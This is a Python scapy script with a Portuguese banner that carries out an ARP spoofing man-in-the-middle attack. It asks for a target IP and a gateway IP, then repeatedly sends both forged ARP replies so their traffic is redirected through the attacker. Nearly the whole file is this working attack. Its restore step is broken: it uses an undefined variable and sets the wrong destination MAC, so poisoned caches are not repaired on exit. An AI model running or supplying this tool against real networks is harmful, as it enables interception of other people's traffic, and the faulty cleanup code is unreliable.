import scapy.all as scapy
import time
                                                 
print('''
   *************************************************************
   *    _   ___ ___     ___ ___  ___   ___  ___ ___ _  _  ___  *
   *   /_\ | _ \ _ \___/ __| _ \/ _ \ / _ \| __|_ _| \| |/ __| *
   *  / _ \|   /  _/___\__ \  _/ (_) | (_) | _| | || .` | (_ | *
   * /_/ \_\_|_\_|     |___/_|  \___/ \___/|_| |___|_|\_|\___| *
   *                                                           *
   *          [!] Não use para fins maliciosos	               *
   *          [!] Não vou reconsiderar seus empregos           *
   ************************************************************* 
	''')
def get_mac(ip):
	arp_request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast / arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
															psrc = spoof_ip)
	scapy.send(packet, verbose = False)


def restore(destino_ip, ip_fonte):
	destination_mac = get_mac(destino_ip)
	mac_fonte = get_mac(ip_fonte)
	packet = scapy.ARP(op = 2, pdst = destino_ip, hwdst = mac_fonte, psrc = ip_fonte, hwsrc = mac_fonte)
	scapy.send(packet, verbose = False)
	

ip_alvo = input(" [?] Digite seu IP de destino : ")
gateway_ip = input(" [?] Digite o IP do seu gateway : ")

try:
	sent_packets_count = 0
	while True:
		spoof(ip_alvo, gateway_ip)
		spoof(gateway_ip, ip_alvo)
		sent_packets_count = sent_packets_count + 2
		print("\r [*] Packets Sent "+str(sent_packets_count), end ="")
		time.sleep(2)

except KeyboardInterrupt:
	print("\n Ctrl + C pressed.............Exiting")
	restore(gateway_ip, target_ip)
	restore(target_ip, gateway_ip)
	print(" Restoring session......")
	print(" [+] Arp Spoof Stopped")
